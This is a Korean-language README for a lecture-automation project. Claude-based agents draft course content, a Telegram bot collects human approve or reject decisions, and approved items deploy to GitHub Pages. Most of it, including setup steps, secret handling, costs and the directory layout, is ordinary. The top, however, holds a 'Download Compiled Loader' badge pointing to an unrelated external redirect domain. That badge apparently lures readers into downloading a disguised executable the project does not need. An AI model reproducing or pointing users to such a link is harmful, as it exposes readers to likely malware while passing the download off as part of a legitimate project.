# 강의 자동화 × AI 에이전트 × 텔레그램 승인

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Claude API로 4명의 도메인 에이전트가 콘텐츠를 만들고, 텔레그램에서 회원님이 ✅/❌을 누르면, 승인된 것만 GitHub Pages 홈페이지에 자동 배포되는 시스템.

> **모든 외부 발행물은 사람의 승인을 거친다** — 이 원칙을 지키기 위해 텔레그램이 단일 컨트롤 패널 역할을 합니다.

---

## 한눈에 보는 흐름

```
briefs/*.json        ← 작업 요청 (커리큘럼·스크립트·랜딩카피·FAQ 등)
       │
       ▼
agents/conductor.py  ← 4개 도메인 에이전트가 Claude API 호출
       │
       ▼
content/pending/     ← 결과물 JSON 적재
       │
       ▼
telegram_bot/notify  ← 텔레그램으로 승인 카드 발송 (✅/✏️/❌/👁)
       │
       ▼
       (회원님이 텔레그램에서 버튼 탭)
       │
       ▼
telegram_bot/poll    ← 콜백 폴링 → approved/ 또는 rejected/ 로 이동
       │
       ▼
site_builder/build   ← approved/ 기준으로 site/*.html 생성
       │
       ▼
GitHub Pages         ← 자동 배포
```

리포 자체가 데이터베이스 + 빌드 캐시 + 배포 소스 역할을 합니다. 별도 서버·DB 필요 없음.

---

## 셋업 (총 약 20분)

### 1. 리포 만들기

이 폴더 전체를 GitHub에 새 리포로 푸시하세요. **public 또는 private** 모두 동작합니다(Pages를 쓰려면 public 권장 — private은 GitHub Pro 필요).

```bash
cd "강의 홈페이지 제작"
git init
git add .
git commit -m "init: 강의 자동화 시스템 부트스트랩"
git branch -M main
git remote add origin git@github.com:<당신아이디>/<리포이름>.git
git push -u origin main
```

### 2. 텔레그램 봇 만들기 (BotFather, 5분)

1. 텔레그램에서 **@BotFather** 검색 → 대화 시작
2. `/newbot` 입력
3. 봇 이름 정하기 (예: `강의자동화봇`)
4. 봇 username 정하기 (예: `lecture_auto_bot`, 끝이 `bot`이어야 함)
5. **BotFather가 `123456:AAA-BBB-CCC...` 형태의 토큰을 줍니다 → 메모**

### 3. 본인 chat_id 확인 (1분)

1. 방금 만든 봇과 대화창을 열고 아무 메시지나 한 번 보내세요 (예: `안녕`)
2. 브라우저에서 다음 URL을 엽니다 (`<TOKEN>` 자리에 위에서 받은 토큰):
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
3. 응답 JSON 안의 `"chat":{"id":123456789,...}` 의 숫자가 회원님의 chat_id입니다 → 메모

### 4. GitHub Secrets 등록

리포 → **Settings → Secrets and variables → Actions → New repository secret** 에서 3개 등록:

| 이름 | 값 |
|---|---|
| `ANTHROPIC_API_KEY` | `sk-ant-...` (콘솔에서 발급한 키) |
| `TELEGRAM_BOT_TOKEN` | `123456:AAA-BBB-CCC...` |
| `TELEGRAM_CHAT_ID` | `123456789` |

### 5. GitHub Pages 활성화

리포 → **Settings → Pages → Source: GitHub Actions** 선택만 하면 됨 (워크플로우가 알아서 배포).

### 6. 첫 워크플로우 실행

리포 → **Actions → Agent Loop → Run workflow → Run workflow** 클릭.

- 처음에는 `briefs/`가 비어 있으니 결과물 생성은 없고, 텔레그램 폴링 + 사이트 빌드(빈 인덱스)만 진행됩니다.
- 텔레그램 봇과 대화창에 `/start` 보내면 인사 메시지 옴 → 연결 확인 완료.

---

## 첫 강의 만들기 (실전 사용)

### 방법 A — 커리큘럼 한 번에 만들기

`briefs/` 폴더에 JSON 파일 하나를 추가하세요:

```bash
cp briefs/example_curriculum_brief.json.template briefs/my-first-course.json
```

`my-first-course.json` 을 열어서 `topic`, `audience`, `lesson_count` 등을 본인 주제로 바꾸세요. 그리고 push:

```bash
git add briefs/my-first-course.json
git commit -m "brief: 첫 강의 커리큘럼 요청"
git push
```

다음 워크플로우 실행(10분 이내)에서:
1. Conductor가 brief를 읽고 Curriculum Architect 호출
2. 결과 커리큘럼이 텔레그램으로 도착 (✅/✏️/❌/👁 버튼)
3. ✅ 누르면 → 다음 실행에서 site/courses/<id>.html 생성 + Pages 배포

### 방법 B — 차시 스크립트 요청

승인된 커리큘럼이 있으면 차시별 스크립트도 같은 방식으로 brief 파일을 만들 수 있습니다:

```json
{
  "agent": "producer",
  "brief": {
    "course_id": "claude-bizflow",
    "course_title": "Claude로 자동화하는 1인 사업가 워크플로우",
    "lesson_no": 1,
    "lesson_title": "왜 자동화인가",
    "objective": "수강생이 자기 업무 중 자동화 후보 3개를 식별할 수 있다",
    "key_concepts": ["반복성", "규칙성", "보상의 비대칭"],
    "exercise": "내 업무 일과표에서 자동화 후보 3개 골라 표로 정리",
    "duration_min": 15
  }
}
```

랜딩 카피(`marketing`)·FAQ(`success`)도 같은 방식.

---

## 텔레그램 카드 사용법

도착하는 카드는 4개 버튼이 달려 있습니다.

| 버튼 | 동작 |
|---|---|
| ✅ 승인 | `approved/`로 이동 → 사이트에 등록 |
| ✏️ 수정요청 | 카드에 답장(reply)으로 수정 지시를 보내면 메모로 저장 (다음 단계에서 재생성 자동화 예정) |
| ❌ 거절 | `rejected/`로 이동, 사이트 미반영 |
| 👁 전체 보기 | 본문 전체를 새 메시지로 받아보기 |

명령어:
- `/start` — 인사
- `/help` — 도움말
- `/pending` — 대기 중 카드 수

---

## 로컬에서 테스트하기 (선택)

GitHub Actions 없이 본인 맥에서 한 사이클 돌려볼 수 있습니다.

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

cp .env.example .env
# .env 파일을 열어 키 3개 채우기

# 한 사이클 실행
export $(cat .env | xargs)
python -m agents.conductor
python -m telegram_bot.notify
python -m telegram_bot.poll      # 텔레그램에서 버튼 누른 뒤
python -m site_builder.build
open site/index.html
```

---

## 디렉토리 구조

```
.
├── agents/                  # 4개 도메인 에이전트 + 베이스 + 컨덕터
│   ├── base.py
│   ├── conductor.py         # 마스터 오케스트레이터
│   ├── curriculum.py        # 강의 기획
│   ├── producer.py          # 콘텐츠 제작
│   ├── marketing.py         # 홍보·마케팅
│   └── success.py           # 수강생·CS
├── telegram_bot/            # 텔레그램 클라이언트 + 발송 + 폴링
│   ├── client.py
│   ├── notify.py
│   └── poll.py
├── site_builder/            # Jinja2 정적 사이트 생성기
│   ├── build.py
│   └── templates/
├── briefs/                  # 작업 요청 (이 폴더에 JSON 두면 처리됨)
├── content/
│   ├── pending/             # 생성 직후 (승인 대기)
│   ├── approved/            # 승인됨 (사이트에 반영)
│   ├── rejected/            # 거절됨
│   └── state/               # 텔레그램 offset 등
├── site/                    # 생성된 정적 사이트 (GitHub Pages 소스)
├── .github/workflows/
│   └── agent-loop.yml       # 10분마다 도는 메인 워크플로우
├── requirements.txt
├── .env.example
└── README.md
```

---

## 비용

- **Claude API**: 코스 1개(커리큘럼 + 8차시 스크립트 + 랜딩카피 + FAQ) 기준 약 $1–3 (Sonnet 4.6 기준)
- **GitHub Actions**: public 리포는 무료, private은 월 2,000분 무료 → 10분마다 1분씩 돈다고 하면 월 4,320분 → public 권장
- **GitHub Pages**: 무료
- **Telegram Bot**: 무료

---

## 안전·신뢰 가드

설계서에 정한 5가지 원칙을 코드에 박아 뒀습니다.

1. **모든 외부 발행은 승인 게이트 통과** — `approved/`만 사이트 빌드 입력
2. **API 키는 Secrets로만** — 리포 코드에는 절대 없음 (.env는 .gitignore)
3. **환불·법적 응대 자동 발송 금지** — Success 에이전트 시스템 프롬프트에 박힘
4. **결과물은 모두 영속화** — `content/`에 JSON으로 남아 추적 가능
5. **중복 처리 방지** — `telegram_message_id` + `state/telegram_offset.json`

---

## 다음 단계 (Phase 2~3 예정)

- ✏️ 수정요청 → 자동 재생성 루프 (revise instruction을 다시 에이전트에게 전달)
- 슬라이드(.pptx) 자동 생성 — Producer의 Slide Designer 서브 에이전트
- 이메일 시퀀스 자동 등록 — Marketing의 Email Sequencer
- LMS API 연동 — 인프런/클래스101 자동 업로드
